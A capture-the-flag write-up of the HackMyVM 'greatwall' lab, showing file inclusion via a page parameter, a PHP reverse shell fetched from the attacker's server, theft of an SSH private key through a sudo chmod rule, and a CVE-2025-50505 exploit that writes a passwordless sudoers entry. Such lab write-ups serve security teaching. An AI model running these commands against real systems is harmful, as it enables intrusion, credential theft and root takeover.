# greatwall

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| greatwall | 20206675 | Beginner | HackMyVM |

**Summary:** The exploitation of the Greatwall machine began with the discovery of a Local File Inclusion (LFI) vulnerability within the web application's page parameter, which allowed for the disclosure of sensitive system files like /etc/passwd. Further testing revealed that the application was also susceptible to Remote File Inclusion (RFI) or Server Side Request Forgery (SSRF), enabling the execution of arbitrary PHP code hosted on an external server. By leveraging this flaw, a reverse shell was established as the www-data user. Initial post exploitation enumeration identified a sudo misconfiguration allowing the www-data user to run chmod as the user wall without a password. This permission was abused to grant full recursive access to the wall user's home directory, facilitating the theft of an SSH private key. After transitioning to the wall user, a second sudo misconfiguration was discovered involving the systemctl management of the clash verge service. By exploiting CVE 2025 50505, an arbitrary script was executed as root to modify the sudoers file, ultimately granting full administrative privileges and allowing for the retrieval of both the user and root flags.

---

## Reconnaissance

1. The initial phase of the attack involved identifying the target machine on the local network. A standard Nmap ping scan was performed across the 192.168.189.0/24 subnet to locate the active host.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ nmap -sn 192.168.189.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 00:17 WIB
Nmap scan report for CLIENT-DESKTOP (192.168.189.1)
Host is up (0.00053s latency).
Nmap scan report for 192.168.189.129
Host is up (0.00083s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 6.10 seconds
```

2. Once the target IP address was confirmed as 192.168.189.129, a comprehensive port scan was executed to determine the available services. The scan targeted all 65,535 TCP ports and included service version detection and default script execution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ nmap -sC -sV -p- -T4 192.168.189.129
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 00:23 WIB
Nmap scan report for 192.168.189.129
Host is up (0.0012s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 dd:8c:5a:5a:8b:43:a1:27:81:13:ff:b6:be:b5:c6:e5 (ECDSA)
|_  256 e4:73:84:da:df:18:e2:f2:db:5e:11:93:b5:d9:54:74 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Hello World
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.71 seconds
```

3. The scan results revealed two open ports: SSH on port 22 and an Apache web server on port 80. Inspection of the web application's source code showed a form that accepts a "page" parameter, which immediately suggested the possibility of file inclusion vulnerabilities.

```javascript
...
<body>
    <div class="typewriter">Across the Great Wall we can reach every corner in the world</div>

    <div class="browser">
        <div class="tab-bar">
            <div class="tab-circle red"></div>
            <div class="tab-circle yellow"></div>
            <div class="tab-circle green"></div>
            <form method="GET" class="address-form">
                <input type="text" name="page" class="address-bar" placeholder="https://">
            </form>
        </div>
        <div class="result">
                    </div>
    </div>
</body>
</html>
```

## Initial Access

1. Testing for Local File Inclusion (LFI) was successful, as the application allowed the reading of the /etc/passwd file through the page parameter. This confirmed the presence of a user named "wall" and the web user "www-data".

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ curl -s 'http://192.168.189.129/index.php?page=file:///etc/passwd'
...
        <div class="result">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
wall:x:1000:1000:wall,,,:/home/wall:/bin/bash
        </div>
...
```

2. Subsequent testing confirmed that the application also supported the http scheme, indicating a Remote File Inclusion (RFI) or SSRF vulnerability. A malicious PHP payload was crafted to test code execution.

![](image.png)

3. To host the payload, a local Python HTTP server was started on port 80.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

4. The payload was then triggered by navigating to the target URL with the page parameter pointing to the local server.

![](image-1.png)

5. The local server logs confirmed that the target machine successfully requested the malicious file.

```bash
172.20.128.1 - - [16/May/2026 08:08:22] "GET /a.php HTTP/1.1" 200 -
```

6. Execution of the payload was confirmed on the web page.

![](image-2.png)

7. A reverse shell payload was then prepared to gain interactive access to the system.

![](image-3.png)

8. A Netcat listener was established on port 22. This specific port was used because other ports appeared to be restricted.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ nc -lvnp 22
listening on [any] 22 ...
```

9. The reverse shell was triggered through the web interface.

![](image-4.png)

10. The connection was successfully received, and a full TTY shell was established using Python.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 50303
which python3
/usr/bin/python3
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@greatwall:~/html$ ^Z
zsh: suspended  nc -lvnp 22

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 22

www-data@greatwall:~/html$ export SHELL=/bin/bash
www-data@greatwall:~/html$ export TERM=xterm
www-data@greatwall:~/html$ stty rows 70 cols 100
```

## Privilege Escalation: wall User

1. Initial enumeration of the www-data user's privileges revealed a sudo entry allowing the execution of /bin/chmod as the user wall without a password.

```bash
www-data@greatwall:/var$ sudo -l
Matching Defaults entries for www-data on greatwall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on greatwall:
    (wall) NOPASSWD: /bin/chmod
www-data@greatwall:/var$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
wall:x:1000:1000:wall,,,:/home/wall:/bin/bash
www-data@greatwall:/var$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 May 10  2025 .
drwxr-xr-x 18 root root 4096 May 10  2025 ..
drwx------  4 wall wall 4096 May 11  2025 wall
```

2. By leveraging the sudo chmod permission, recursive 6777 permissions were applied to the wall user's home directory. This granted the www-data user full access to all files within the directory, including sensitive SSH keys and the user flag.

```bash
www-data@greatwall:/var$ sudo -u wall /bin/chmod 6777 -R /home/wall
www-data@greatwall:/var$ ls -la /home/wall
total 32
drwsrwsrwx 4 wall wall 4096 May 11  2025 .
drwxr-xr-x 3 root root 4096 May 10  2025 ..
lrwxrwxrwx 1 root root    9 May 11  2025 .bash_history -> /dev/null
-rwsrwsrwx 1 wall wall  220 May 10  2025 .bash_logout
-rwsrwsrwx 1 wall wall 3526 May 10  2025 .bashrc
drwsrwsrwx 3 wall wall 4096 May 11  2025 .local
-rwsrwsrwx 1 wall wall  807 May 10  2025 .profile
drwsrwsrwx 2 wall wall 4096 May 11  2025 .ssh
-rwsrwsrwx 1 wall wall 1808 May 11  2025 user.flag
```

3. The wall user's SSH private key was located and extracted.

```bash
www-data@greatwall:/var$ cd /home/wall/.ssh
www-data@greatwall:/home/wall/.ssh$ ls -la
total 20
drwsrwsrwx 2 wall wall 4096 May 11  2025 .
drwsrwsrwx 4 wall wall 4096 May 16 09:18 ..
-rwsrwsrwx 1 wall wall  568 May 11  2025 authorized_keys
-rwsrwsrwx 1 wall wall 2602 May 11  2025 id_rsa
-rwsrwsrwx 1 wall wall  568 May 11  2025 id_rsa.pub
www-data@greatwall:/home/wall/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
.......................[REDACTED].............................
QMXdH6a7iy89MAAAAOd2FsbEBncmVhdHdhbGwBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

4. To ensure the SSH service would accept the key, the permissions on the .ssh directory and its contents were restored to their appropriate restrictive states using the sudo chmod capability.

```bash
www-data@greatwall:/home/wall/.ssh$ sudo -u wall /bin/chmod 700 /home/wall/.ssh
www-data@greatwall:/home/wall/.ssh$ sudo -u wall /bin/chmod 600 /home/wall/.ssh/authorized_keys
www-data@greatwall:/home/wall/.ssh$ sudo -u wall /bin/chmod 644 /home/wall/.ssh/id_rsa.pub
www-data@greatwall:/home/wall/.ssh$ sudo -u wall /bin/chmod 600 /home/wall/.ssh/id_rsa
```

5. On the attacker's machine, the private key was saved to a file, given the correct permissions, and used to log in as the wall user via SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ vim id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/greatwall]
└─$ ssh wall@192.168.189.129 -i id_rsa
Linux greatwall 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64

Last login: Sat May 16 09:23:11 2026 from 192.168.189.1
wall@greatwall:~$ id;ls -la
uid=1000(wall) gid=1000(wall) groups=1000(wall),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
total 1268
drwsrwsr-x 4 wall     wall    4096 May 16 09:18 .
drwxr-xr-x 3 root     root    4096 May 10  2025 ..
lrwxrwxrwx 1 root     root       9 May 11  2025 .bash_history -> /dev/null
-rwsrwsrwx 1 wall     wall     220 May 10  2025 .bash_logout
-rwsrwsrwx 1 wall     wall    3526 May 10  2025 .bashrc
drwsrwsrwx 3 wall     wall    4096 May 11  2025 .local
-rwsrwsrwx 1 wall     wall     807 May 10  2025 .profile
drws--S--- 2 wall     wall    4096 May 11  2025 .ssh
-rwsrwsrwx 1 wall     wall    1808 May 11  2025 user.flag
```

## Privilege Escalation: root User

1. Further enumeration as the wall user revealed another sudo privilege: the ability to start the clash verge service using systemctl.

```bash
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
```

2. Researching the service identified a vulnerability tracked as CVE 2025 50505 (`https://github.com/a0yami/CVE-2025-50505`), which allows for arbitrary code execution during the service startup process. The service was started to confirm it was listening on the local interface.

```bash
wall@greatwall:~$ sudo /usr/bin/systemctl start clash-verge-service
wall@greatwall:~$ ss -tlnp
State      Recv-Q     Send-Q         Local Address:Port            Peer Address:Port     Process
LISTEN     0          128                127.0.0.1:33211                0.0.0.0:*
```

3. An exploit script was created to append a new sudoers entry for the wall user, granting full root privileges without a password. The script was then executed by sending a malicious POST request to the locally listening service.

```bash
wall@greatwall:~$ cat << 'EOF' > /tmp/exp.sh
#!/bin/bash
echo "wall ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/wall
EOF
wall@greatwall:~$ chmod +x /tmp/exp.sh
wall@greatwall:~$ curl -X POST 'http://127.0.0.1:33211/start_clash' -H "Content-Type: application/json" -d '{"bin_path": "/tmp/exp.sh", "config_dir": "", "config_file": "", "log_file": "/dev/null"}'
{"code":0,"msg":"ok","data":null}
```

4. The exploit was successful, as the wall user now possessed unrestricted sudo permissions. Root access was obtained using sudo -i.

```bash
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
    (ALL : ALL) NOPASSWD: ALL
wall@greatwall:~$ sudo -i
root@greatwall:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
greatwall
```

5. Finally, the user and root flags were retrieved, completing the challenge.

```bash
root@greatwall:~# cat /home/wall/user.flag /root/r007.7x7oZzZzZzzzz
                                                          .'.
                                                      .':ldd.
                                                  .,:oddddd:
                                              .,cdddddddddd
                                          .,cddddddddddddd:
                                      .;lddddddddddddddddd.
                                  .;lddddddddddddddddddddl
                              .,cddddddddddddccoddddddddd.
                          .;cdddddddddddddl,.:ddddddddddc
                     .';lddddddddddddddo;. ,dddddddddddd.
                 .':lddddddddddddddddc.  'oddddddddddddc
             .':odddddddddddddddddl,   .cdddddddddddddd.
         .':oddddddddddddddddddd:.    ;dddddddddddddddo
      ';lddddddddddddddddddddl,     'odddddddddddddddd'
       ..,:lodddddddddddddo;.     .cdddddddddddddddddl
             ..';codddddc.      .:ddddddddddddddddddd.
                    ..'        ,ddddddddddddddddddddc
                              ;ldddddddddddddddddddd.
                                 ..';clddddddddddddc
                                        ..,:loddddd.
                             .c:,..           ..',:
                             'ddddd'
                             'dddl.
                             ,dd,
                             ;o.
                             .

flag{b08[REDACTED]}
                       ,'.                    ,',
                      ,''',.                .,'',
                      ,''''''              .'''''.
                     .''''''''............''''''';
                     ;''''''''''''''''''''''''''''
                     ''''''''''''''''''''''''''''',
                    ....'''''''''''''''''''''''...,
                    ,.....;xkl'...........'dkd,.....
                    ,.....OMMM;...........cMMMd.....
                   .......'cl,.............;l:.....;
                   '.............':cc:,.............
                   ,.................................
                   .................................,
                  ...................................
                  ....................................
         ....     ,..................................'
        ...       ...................................,
        ,..      .....................................
        ...'     ......................................
          ....   '.....................................
             .........................................'

flag{b3d[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Identified open ports 22 (SSH) and 80 (HTTP) on the target machine.
2. **Vulnerability Discovery**: Found a page parameter on the web server vulnerable to both Local and Remote File Inclusion.
3. **Exploitation**: Used the RFI vulnerability to execute a PHP reverse shell, gaining access as the www-data user.
4. **Internal Enumeration**: Discovered a sudo misconfiguration allowing www-data to run chmod as the wall user, which was used to steal an SSH private key.
5. **Privilege Escalation**: Exploited CVE 2025 50505 via a sudo misconfiguration in the clash verge service to gain root access.

